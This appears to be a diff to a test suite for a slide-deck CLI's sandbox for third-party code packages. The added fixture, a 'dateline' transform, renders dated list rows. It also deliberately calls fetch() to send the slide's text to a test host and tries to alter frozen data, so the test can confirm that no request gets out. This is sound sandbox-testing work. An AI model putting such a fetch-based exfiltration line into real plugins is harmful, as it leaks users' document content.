@@ -19,6 +19,9 @@
  * The returned section also names a LOCAL file, twice: as a logo mask (a pass after the door used to
  * read that file into the export) and as a relative image. Neither address survives.
  *
+ *   FACTS     a second package, `dateline`, draws from `slide.facts` ALONE (the stable input; it never
+ *             reads `slide.html`), and tries to send those facts out           → it draws, 0 requests
+ *
  * Slow tier: four CLI renders.
  */
 
@@ -70,6 +73,29 @@ function tally(slide, kit) {
   return "\\n" + slide.html.replace(' class="', ' class="video tally-drawn ').replace(/<ul>[\\s\\S]*?<\\/ul>/, '<div class="tally-marks" data-count="' + n + '">' + marks + "</div>" + ${JSON.stringify(remoteMarkup(H) + localMarkup(secretFile) + forgedNote)}) + "\\n";
 }
 export { tally as default };
+`;
+
+/**
+ * A package written against `slide.facts` only (lib/packages/slide-facts.mjs): it draws a dated list
+ * as rows, from the facts' title and first list, and never reads `slide.html`. It also tries to send
+ * the facts out, and to change them.
+ */
+const factsTransform = (H) => `
+function dateline(slide) {
+  var f = slide.facts;
+  try { fetch("${H}/facts?d=" + encodeURIComponent(f.text)).catch(function(){}); } catch (e) {}
+  var list = f.blocks.find(function (b) { return b.type === "list"; });
+  var frozen = true;
+  try { f.blocks.push({}); frozen = false; } catch (e) {}
+  var esc = function (s) { return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;"); };
+  var rows = (list ? list.items : []).map(function (it) {
+    var m = /^(\\d{4}-\\d{2}-\\d{2})\\s+(.*)$/.exec(it.text) || [null, "", it.text];
+    return '<li class="dateline-row"><b class="dateline-date">' + esc(m[1]) + "</b> " + esc(m[2]) + "</li>";
+  }).join("");
+  var paint = f.tokens.indexOf("--cat-1-mark") >= 0 ? "var(--cat-1-mark)" : "currentColor";
+  return '<section class="' + f.classes.join(" ") + ' dateline-drawn"><h2>' + esc(f.title) + '</h2><ol class="dateline-rows" style="color:' + paint + '">' + rows + "</ol><p>facts v" + f.version + ", frozen " + frozen + ", directive " + esc(f.directives.class) + "</p></section>";
+}
+export { dateline as default };
 `;
 
 const pkgFiles = (code) => ({
@@ -190,6 +216,39 @@ describe('code packages: the CLI door', { timeout: TIMEOUT }, () => {
     assert.match(out, /the speaker note/);
     await settle();
     assert.deepEqual(hits, []);
+  });
+
+  test('a package that reads only slide.facts draws from them, and reaches nothing', async () => {
+    const src = tmp('facts-src');
+    fs.mkdirSync(path.join(src, 'dateline'));
+    const files = {
+      'dateline.manifest.json': JSON.stringify({ name: 'dateline', type: 'component', format: 1 }),
+      'dateline.styles.css': 'section.dateline .dateline-rows { display: grid; gap: 0.25em; }\n',
+      'dateline.gallery.md': '<!-- _class: dateline -->\n\n## Plan\n\n- 2026-01-10 Kickoff\n',
+      'dateline.transform.js': factsTransform(H),
+    };
+    for (const [f, b] of Object.entries(files)) fs.writeFileSync(path.join(src, 'dateline', f), b);
+    assert.equal((await cli(['add', path.join(src, 'dateline')])).status, 0);
+    assert.equal((await cli(['trust', 'component/dateline', '--yes'])).status, 0);
+    const factsDeck = '---\ntheme: indaco\n---\n\n<!-- _class: dateline -->\n\n## Launch plan\n\n- 2026-01-10 **Kickoff**\n- 2026-03-02 Beta & pilot\n- 2026-06-30 [General availability](https://example.test)\n';
+    const dir = tmp('facts-html');
+    fs.writeFileSync(path.join(dir, 'deck.md'), factsDeck);
+    hits.length = 0;
+    const r = await new Promise((resolve) => execFile(process.execPath, [EMULATOR, path.join(dir, 'deck.md'), path.join(dir, 'deck.html'), '--allow-remote'], { encoding: 'utf8', env: { ...process.env, LATTICE_HOME: home }, timeout: TIMEOUT }, (e, stdout, stderr) => resolve({ e, text: `${stdout}\n${stderr}` })));
+    await settle();
+    assert.equal(r.e, null, r.text);
+    assert.doesNotMatch(r.text, /did not draw/, 'the package must have drawn, or the zero below proves nothing');
+    const out = fs.readFileSync(path.join(dir, 'deck.html'), 'utf8');
+    // The masthead lift, a pass after the door, frames the package's heading as it frames a chart's.
+    assert.match(out, /class="masthead-lede"><h2>Launch plan<\/h2>/);
+    assert.match(out, /<ol class="dateline-rows" style="color:var\(--cat-1-mark\)">/);
+    // The engine's classes, which a package drawing from facts cannot know, are put back by the door.
+    assert.match(out, /<section[^>]*class="dateline content form dateline-drawn"/);
+    assert.match(out, /<li class="dateline-row"><b class="dateline-date">2026-01-10<\/b> Kickoff<\/li>/, 'list text arrives as plain text, markup gone');
+    assert.match(out, /<b class="dateline-date">2026-03-02<\/b> Beta &amp; pilot/);
+    assert.match(out, /<b class="dateline-date">2026-06-30<\/b> General availability<\/li>/);
+    assert.match(out, /facts v1, frozen true, directive dateline/);
+    assert.deepEqual(hits, [], 'the package reached the network');
   });
 
   test('the OS layer: as root on Linux, a Chromium the unprivileged user can run gets the OS sandbox, measured', async (t) => {
